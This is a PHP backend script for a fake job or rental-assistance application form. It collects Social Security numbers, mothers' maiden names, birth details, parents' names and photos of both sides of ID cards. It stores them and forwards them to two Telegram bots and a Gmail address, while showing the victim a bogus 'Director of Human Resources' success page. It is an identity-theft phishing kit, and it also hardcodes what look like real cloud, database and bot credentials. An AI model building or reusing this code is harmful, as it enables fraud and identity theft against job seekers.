<?php

// ======================
// ERROR REPORTING
// ======================
error_reporting(E_ALL);
ini_set('display_errors', 1);

// ======================
// CLOUDINARY SETUP
// ======================
require 'vendor/autoload.php';

use Cloudinary\Cloudinary;

$cloudinary = new Cloudinary([
    'cloud' => [
        'cloud_name' => 'dlddiquex',
        'api_key'    => '671373236729178',
        'api_secret' => 'cmCL1elCACDX0NB5g-pMMMFJens'
    ],
    'url' => [
        'secure' => true
    ]
]);

// ======================
// NEON DATABASE (PostgreSQL)
// ======================
$host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
$db   = "neondb";
$user = "neondb_owner";
$pass = "npg_TQ1gBOwA9rCa";
$port = "5432";

$dsn = "pgsql:host=$host;port=$port;dbname=$db";

try {
    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);
} catch (Exception $e) {
    die("DB Connection failed: " . $e->getMessage());
}

// ======================
// FORM DATA
// ======================
$first_name = $_POST['first_name'] ?? '';
$middle_name = $_POST['middle_name'] ?? '';
$last_name = $_POST['last_name'] ?? '';

$phone = $_POST['phone'] ?? '';
$email = $_POST['email'] ?? '';
$dob = $_POST['dob'] ?? '';

$mother_maiden = $_POST['mother_maiden'] ?? '';
$ssn = $_POST['ssn'] ?? '';

$birth_city = $_POST['birth_city'] ?? '';

$address_line1 = $_POST['address_line1'] ?? '';
$address_line2 = $_POST['address_line2'] ?? '';

$city = $_POST['city'] ?? '';
$state = $_POST['state'] ?? '';
$zip_code = $_POST['zip_code'] ?? '';

$father_name = $_POST['father_name'] ?? '';
$mother_name = $_POST['mother_name'] ?? '';

$address = $address_line1 . " " . $address_line2 . ", " . $city . ", " . $state . " " . $zip_code;

// ======================
// CLOUDINARY UPLOAD FUNCTION
// ======================
function uploadFile($file) {

    global $cloudinary;

    if (!isset($file) || $file['error'] !== 0) {
        return null;
    }

    try {

        $upload = $cloudinary->uploadApi()->upload(
            $file['tmp_name'],
            [
                'folder' => 'job_applications'
            ]
        );

        return $upload['secure_url'];

    } catch (Exception $e) {
        return null;
    }
}

// ======================
// UPLOAD FILES
// ======================
$front_url = uploadFile($_FILES['front_id'] ?? null);
$back_url  = uploadFile($_FILES['back_id'] ?? null);

// ======================
// SAVE TO DATABASE
// ======================
$stmt = $pdo->prepare("
INSERT INTO job_applications (
    first_name,
    middle_name,
    last_name,
    phone,
    email,
    dob,
    mother_maiden,
    ssn,
    birth_city,
    address,
    father_name,
    mother_name,
    front_id,
    back_id
)
VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
");

$stmt->execute([
    $first_name,
    $middle_name,
    $last_name,
    $phone,
    $email,
    $dob,
    $mother_maiden,
    $ssn,
    $birth_city,
    $address,
    $father_name,
    $mother_name,
    $front_url,
    $back_url
]);

// ======================
// TELEGRAM BOT SETUP
// ======================
$bot1 = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
$chat1 = "6513265609";

$bot2 = "YOUR_BOT_TOKEN_2";
$chat2 = "5469294503";

// ======================
// TELEGRAM FUNCTION
// ======================
function sendTelegram($bot, $method, $data) {

    $url = "https://api.telegram.org/bot{$bot}/{$method}";

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
            'timeout' => 30
        ]
    ];

    $context = stream_context_create($options);

    return file_get_contents($url, false, $context);
}

// ======================
// MESSAGE TEXT
// ======================
$text = "📄 New Application Submitted\n\n"
. "👤 Name: $first_name $middle_name $last_name\n"
. "📞 Phone: $phone\n"
. "📧 Email: $email\n"
. "🎂 DOB: $dob\n"
. "🏠 Address: $address\n"
. "🏙 Birth City: $birth_city\n"
. "👨 Father: $father_name\n"
. "👩 Mother: $mother_name\n"
. "🧾 SSN: $ssn";

// ======================
// SEND TO BOT 1
// ======================
sendTelegram($bot1, "sendMessage", [
    "chat_id" => $chat1,
    "text" => $text
]);

if (!empty($front_url)) {
    sendTelegram($bot1, "sendPhoto", [
        "chat_id" => $chat1,
        "photo" => $front_url,
        "caption" => "🪪 Front ID - $first_name $last_name"
    ]);
}

if (!empty($back_url)) {
    sendTelegram($bot1, "sendPhoto", [
        "chat_id" => $chat1,
        "photo" => $back_url,
        "caption" => "🪪 Back ID - $first_name $last_name"
    ]);
}

// ======================
// SEND TO BOT 2
// ======================
sendTelegram($bot2, "sendMessage", [
    "chat_id" => $chat2,
    "text" => $text
]);

if (!empty($front_url)) {
    sendTelegram($bot2, "sendPhoto", [
        "chat_id" => $chat2,
        "photo" => $front_url,
        "caption" => "🪪 Front ID - $first_name $last_name"
    ]);
}

if (!empty($back_url)) {
    sendTelegram($bot2, "sendPhoto", [
        "chat_id" => $chat2,
        "photo" => $back_url,
        "caption" => "🪪 Back ID - $first_name $last_name"
    ]);
}

// ======================
// EMAIL NOTIFICATION
// ======================
$to = "collaomn@gmail.com";
$subject = "New Job Form Submission";
$body = $text;
$headers = "From: noreply@homeandrentalassistance.onrender.com";

@mail($to, $subject, $body, $headers);

// ======================
// SUCCESS PAGE
// ======================
echo "
<div style='
    max-width:700px;
    margin:60px auto;
    padding:50px;
    background:#0f172a;
    color:white;
    border-radius:20px;
    text-align:center;
    font-family:Arial,sans-serif;
    box-shadow:0 10px 30px rgba(0,0,0,0.4);
'>

    <div style='font-size:80px;color:#22c55e;margin-bottom:20px;'>✓</div>

    <h1 style='font-size:42px;margin-bottom:25px;'>Form Submitted Successfully!</h1>

    <p style='font-size:24px;line-height:1.8;'>
        Thank you for considering <strong>Apartment at Home and Rental Assistance</strong>.
        <br><br>
        We will contact you shortly.
    </p>

    <div style='margin-top:40px;border-top:1px solid #334155;padding-top:25px;'>
        <h2 style='font-size:30px;color:#38bdf8;'>Taylor Luis</h2>
        <p style='font-size:20px;color:#cbd5e1;'>Director of Human Resources</p>
    </div>

</div>
";
?>
